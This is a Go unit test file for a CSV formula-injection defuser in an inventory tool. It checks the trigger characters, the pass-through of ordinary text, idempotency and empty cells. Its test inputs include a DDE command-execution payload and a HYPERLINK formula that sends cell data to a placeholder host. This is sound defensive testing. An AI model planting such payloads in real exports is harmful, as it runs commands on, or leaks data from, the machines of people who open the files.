// invctl — infrastructure inventory
// Copyright (C) 2026 Madalin Ignisca <hi@madalin.me>
//
// Licensed under the GNU Affero General Public License, version 3 only —
// no later version applies. See LICENSE for the full text.
//
// SPDX-License-Identifier: AGPL-3.0-only

package csvsafe

import (
	"strings"
	"testing"
)

// This package shipped with no test file at all (WP-A4 follow-up), which is
// the wrong shape for the one security control on the CSV boundary -- and it
// was EXTRACTED from a package that had coverage, so the coverage was lost in
// the move rather than never written. It is exercised indirectly through the
// export paths, which proves it is called, not that it is correct.

// TestCellDefusesEveryTriggerByte pins the trigger set itself.
//
// Excel and LibreOffice evaluate a cell beginning with = + - or @; tab and
// carriage return matter because they can smuggle a value into the next cell
// where it then leads. Losing one of these from the switch is a silent
// regression -- the export still succeeds, the file still opens, and the cell
// runs.
func TestCellDefusesEveryTriggerByte(t *testing.T) {
	for _, tc := range []struct {
		name string
		in   string
	}{
		{"equals, the classic formula", `=1+1`},
		{"plus", `+1`},
		{"minus, also a formula lead", `-1+1`},
		{"at, used by some functions", `@SUM(A1)`},
		{"tab", "\tinjected"},
		{"carriage return", "\rinjected"},
		{"the DDE payload shape", `=cmd|' /C calc'!A0`},
		{"a hyperlink that exfiltrates", `=HYPERLINK("http://x/?d="&A1,"click")`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := Cell(tc.in)
			if !strings.HasPrefix(got, "'") {
				t.Errorf("Cell(%q) = %q -- not defused; a spreadsheet opening this "+
					"export evaluates it", tc.in, got)
			}
			// Nothing may be removed: an export that silently altered a value
			// would be worse than the problem it solves (see Cell's comment).
			if got != "'"+tc.in {
				t.Errorf("Cell(%q) = %q -- the original text must survive intact "+
					"behind the apostrophe", tc.in, got)
			}
		})
	}
}

// TestCellLeavesOrdinaryTextAlone is the other half. A defuser that prefixed
// everything would pass the test above and quietly corrupt every export.
func TestCellLeavesOrdinaryTextAlone(t *testing.T) {
	for _, in := range []string{
		"hv-01",
		"Gold Tier",
		"192.0.2.10",
		"a value with = inside it but not leading",
		"1+1",              // digit first: not a formula lead
		"  =notleading",    // space first
		"café",             // multi-byte: first byte is never a trigger
		"'already defused", // see the idempotency test below
	} {
		if got := Cell(in); got != in {
			t.Errorf("Cell(%q) = %q -- ordinary text must pass through untouched", in, got)
		}
	}
}

// TestCellIsIdempotent asserts the property Cell's own doc comment leans on
// and nothing checked.
//
// IT IS LOAD-BEARING, NOT INCIDENTAL. A custom field value is defused once
// where it enters a Table (internal/store, which may not import internal/web)
// and again wherever that Table is written out (render.CSV). Every exported
// custom value therefore goes through Cell TWICE. If the second pass were not
// a no-op, every such cell would arrive at the operator wearing two
// apostrophes -- a visible corruption of real data on the ordinary path, not
// an edge case.
func TestCellIsIdempotent(t *testing.T) {
	for _, in := range []string{
		"", "=1+1", "+1", "-1", "@x", "\tx", "\rx",
		"hv-01", "'already", "''twice", "1+1", "café",
	} {
		once := Cell(in)
		twice := Cell(once)
		if twice != once {
			t.Errorf("Cell is not idempotent for %q: once=%q twice=%q -- every exported "+
				"custom field value passes through Cell twice, so a second pass that "+
				"changes anything corrupts the ordinary path", in, once, twice)
		}
	}
}

// TestCellPassesTheEmptyStringThrough guards the one early return. Returning
// "'" for an empty cell would put an apostrophe in every blank column of
// every export.
func TestCellPassesTheEmptyStringThrough(t *testing.T) {
	if got := Cell(""); got != "" {
		t.Errorf("Cell(%q) = %q -- an empty cell must stay empty", "", got)
	}
}
